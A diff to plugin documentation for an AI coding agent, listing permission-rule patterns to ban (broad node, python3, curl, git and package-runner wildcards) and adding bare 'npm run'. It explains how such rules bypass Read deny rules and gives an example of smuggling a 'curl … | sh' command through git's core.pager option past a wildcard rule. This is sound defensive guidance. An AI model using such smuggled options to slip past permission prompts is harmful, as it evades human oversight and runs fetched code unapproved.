@@ -76,7 +76,7 @@ So the question for any rule is which layer it belongs to. "Prefer named exports
 
 The skills in this plugin will not propose a broad permission rule, and `claude-setup` explicitly refuses several. The patterns worth banning outright:
 
-- **`Bash(node:*)`, `Bash(python3:*)`, `Bash(curl:*)`** and the package-manager runners (`npx`, `bunx`, `uv run`, `poetry run`, `pipenv run`). Each is unrestricted code execution. A script run this way reads any file it likes, which bypasses every `Read` deny rule you wrote.
+- **`Bash(node:*)`, `Bash(python3:*)`, `Bash(curl:*)`** and the package-manager runners (`npx`, `bunx`, `uv run`, `poetry run`, `pipenv run`, and bare `npm run` — allow named scripts instead). Each is unrestricted code execution. A script run this way reads any file it likes, which bypasses every `Read` deny rule you wrote.
 - **`Bash(git:*)`** — auto-approves `reset --hard`, `clean -fd`, `checkout -- .`. Use per-subcommand allows.
 - **Any wildcard *before* the subcommand.** `Bash(git -C * status*)` looks path-scoped and is not: the wildcard sits where git's own options go, and several `-c` config keys execute commands (`core.pager` on `log`, `core.sshCommand` on `fetch`). So `git -C . -c core.pager='curl … | sh' log` matches that rule and runs without a prompt. **A wildcard is only safe after the subcommand.** Deny rules are the exception — an over-matching deny is safe, so leave those wildcarded.
 - **`Write(path)` rules for files.** They are silently unenforced. Use `Edit(path)`, which already covers every file-editing tool.
